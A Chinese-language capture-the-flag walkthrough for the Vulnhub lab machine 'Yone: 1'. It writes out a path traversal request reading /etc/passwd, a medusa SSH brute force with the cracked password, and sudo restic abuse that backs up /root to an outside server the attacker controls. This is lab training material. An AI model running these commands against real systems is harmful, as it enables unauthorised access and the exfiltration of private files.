---
title: 你的文章标题
published: 2026-08-17
---


## 📌 题目信息

| 项目          | 内容                                        |
| :---------- | :---------------------------------------- |
| **题目名称**    | Yone: 1                                   |
| **题目来源**    | Vulnhub                                   |
| **题目类型**    | Boot2Root / CTF 靶机                        |
| **题目网址**    | https://www.vulnhub.com/entry/yone-1,543/ |
| **子分类**     | 渗透测试综合靶场                                  |
| **考点**      | 路径遍历漏洞、SSH密码爆破、Sudo提权（restic备份工具滥用）       |
| **难度**      | ⭐⭐⭐（中等）                                   |
| **最终 Flag** | `flag{...}`（位于 `/root` 目录下，需通过提权获取）       |
![[Pasted image 20260727134634.png]]
## 🛠️ 使用工具
- **nmap**：主机发现与端口扫描
- **medusa**：SSH服务密码爆破
- **SSH**：远程登录
- **restic / rest-server**：备份工具，用于提权
- **公网云服务器**：作为restic服务端接收备份数据
## 📝 解题思路

### 第 1 步：主机发现与端口扫描

已知攻击机（Kali）的IP地址为 `192.168.197.10`，靶机与攻击机处于同一网段。使用 `nmap` 扫描该网段内的存活主机：
```bash
sudo nmap -sn 192.168.197.0/24
```
![[Pasted image 20260727135813.png]]
扫描结果中，除网关（如 `192.168.197.2`）和本机（`.10`）外，发现另一台主机 `192.168.197.172`。对该主机进行全端口扫描：
```bash
nmap -p- -A 192.168.197.172
```
结果如下：
```
┌──(root㉿kali)-[~]
└─# nmap -p- -A 192.168.197.172
Starting Nmap 7.99 ( https://nmap.org ) at 2026-07-27 13:58 +0800
Nmap scan report for 192.168.197.172
Host is up (0.00069s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 92:0b:28:86:f2:2f:37:e6:01:45:95:c8:6f:b8:56:f0 (RSA)
|   256 46:9c:6f:fc:0a:e6:fa:5d:d2:99:5a:3f:63:dd:2f:12 (ECDSA)
|_  256 9c:00:a2:3b:31:60:db:41:e0:29:d1:e7:af:39:4e:f4 (ED25519)
80/tcp open  http    nginx 1.10.3 (Ubuntu)
|_http-server-header: nginx/1.10.3 (Ubuntu)
|_http-generator: Li\xC3\xAAn Minh Huy\xE1\xBB\x81n Tho\xE1\xBA\xA1i | LMHT
|_http-title: Ph\xC3\xA2n t\xC3\xADch chuy\xC3\xAAn s\xC3\xA2u: Yone
MAC Address: 00:0C:29:71:F6:32 (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.14, Linux 3.8 - 3.16
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.69 ms 192.168.197.172

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.24 seconds
```
![[Pasted image 20260727140139.png]]
仅开放22（SSH）和80（HTTP）两个端口。
### 第 2 步：Web信息收集与域名绑定

使用浏览器访问 `http://192.168.197.172`，页面显示为一个图片展示网站，但部分图片无法加载。
![[Pasted image 20260727150304.png]]
查看图片元素的URL，发现它们指向域名 `yone.lc`（例如 `http://yone.lc/storage/upload/xxx.jpg`）。因此需要在Kali的 `/etc/hosts` 文件中添加解析：

```bash
sudo sh -c 'echo "192.168.197.172 yone.lc" >> /etc/hosts'
```
![[Pasted image 20260727150219.png]]
之后即可通过 `http://yone.lc` 正常访问网站。

### 第 3 步：注册与文件上传功能分析

在网站首页点击“Register”注册一个普通账号，登录后进入文件管理面板。页面上已存在两张示例图片，并提供文件上传功能。

点击任意一张图片，浏览器地址栏变为：

```
http://yone.lc/download?link=right.jpg
```

观察到 `link` 参数直接指定了文件名，可能存在路径遍历漏洞。

### 第 4 步：路径遍历漏洞利用与用户枚举

将 `link` 参数修改为 `/etc/passwd` 的路径：

```
http://yone.lc/download?link=../../../../../../../../etc/passwd
```

服务器返回了 `/etc/passwd` 文件内容，其中包含一个普通用户：

```
yone:x:1000:1000:yone,,,:/home/yone:/bin/bash
```

由此获得系统用户名 **`yone`**。

### 第 5 步：SSH密码爆破

已知SSH服务开放，且存在用户 `yone`，可以利用密码字典进行爆破。Kali自带 `rockyou.txt` 字典，先解压：

```bash
sudo gunzip /usr/share/wordlists/rockyou.txt.gz
```

使用 `medusa` 进行爆破：

```bash
medusa -u yone -P /usr/share/wordlists/rockyou.txt -h <靶机IP> -M ssh -F -t 10
```

参数说明：
- `-u`：指定用户名
- `-P`：指定字典文件
- `-h`：目标主机
- `-M`：服务模块（ssh）
- `-F`：找到正确密码后停止
- `-t`：线程数（10）

爆破成功输出：

```
ACCOUNT FOUND: [ssh] Host: 192.168.197.xx User: yone Password: 12345qwert [SUCCESS]
```

得到SSH登录密码 **`12345qwert`**。

### 第 6 步：获取普通用户shell

使用SSH登录：

```bash
ssh yone@<靶机IP>
```

输入密码 `12345qwert` 后成功进入系统，当前用户为 `yone`。

### 第 7 步：提权信息收集

查看当前用户可执行的sudo命令：

```bash
sudo -l
```

输出显示：

```
User yone may run the following commands on yone:
    (ALL) NOPASSWD: /usr/bin/restic
```

即 `yone` 用户可以在**无密码**的情况下以root权限执行 `/usr/bin/restic` 命令。

`restic` 是一款备份工具，支持将目录备份到远程服务器。利用该特性，可以备份 `/root` 目录并导出其中的文件。

### 第 8 步：利用restic备份获取root文件

由于靶机处于内网，无法直接连接内网中的攻击机，因此需要一台**具有公网IP的服务器**来接收备份数据。

在公网服务器上安装Go环境和restic，并编译运行 `rest-server`：

```bash
# 安装依赖
apt-get install golang restic
# 克隆源码
git clone https://github.com/restic/rest-server.git
cd rest-server
export GOPROXY="https://goproxy.cn"
CGO_ENABLED=0 go build -o rest-server ./cmd/rest-server
# 启动服务（测试环境禁用认证）
./rest-server --no-auth
```

此时服务器监听在 `8000` 端口。

回到靶机，首先在远程服务器上初始化仓库（过程中会要求输入仓库密码，随意设置，如 `123456`）：

```bash
restic -r rest:http://<公网IP>:8000/rest1 init
```

然后使用 `sudo` 以root权限备份 `/root` 目录：

```bash
sudo restic -r rest:http://<公网IP>:8000/rest1 backup /root
```

备份完成后，在公网服务器上查看快照并挂载：

```bash
restic -r rest:http://localhost:8000/rest1 snapshots
restic -r rest:http://localhost:8000/rest1 mount /mnt/restic
```

挂载后，在 `/mnt/restic/snapshots/<快照ID>/root` 路径下即可找到 `/root` 目录中的所有文件，包括最终的 `flag` 文件。

### 第 9 步：获取Flag

读取 `flag` 文件内容：

```bash
cat /mnt/restic/snapshots/*/root/flag.txt
```

得到最终Flag。

## 🏁 最终 Flag

```text
flag{...}   # 实际值需在环境内获取
```

> **说明**：由于每个靶机实例生成的Flag可能不同，此处仅做占位。实际通关后请自行记录。















































